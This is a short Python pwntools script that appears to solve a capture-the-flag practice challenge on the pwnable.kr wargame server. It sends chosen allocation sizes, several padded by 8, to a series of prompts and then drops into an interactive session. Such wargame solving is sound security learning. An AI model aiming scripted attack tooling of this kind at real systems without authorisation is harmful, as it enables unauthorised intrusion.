from pwn import *

r = remote("pwnable.kr", 9022)

sla = r.sendlineafter

sla(b"8 ~ 16 : ", str(8).encode())
sla(b"16 ~ 32 : ", str(16).encode())
sla(b"32 ~ 64 : ", str(32).encode())
sla(b"64 ~ 128 : ", str(64 + 8).encode())
sla(b"128 ~ 256 : ", str(128 + 8).encode())
sla(b"256 ~ 512 : ", str(256 + 8).encode())
sla(b"512 ~ 1024 : ", str(512 + 8).encode())
sla(b"1024 ~ 2048 : ", str(1024 + 8).encode())
sla(b"2048 ~ 4096 : ", str(2048 + 8).encode())
sla(b"4096 ~ 8192 : ", str(4096).encode())

r.interactive()
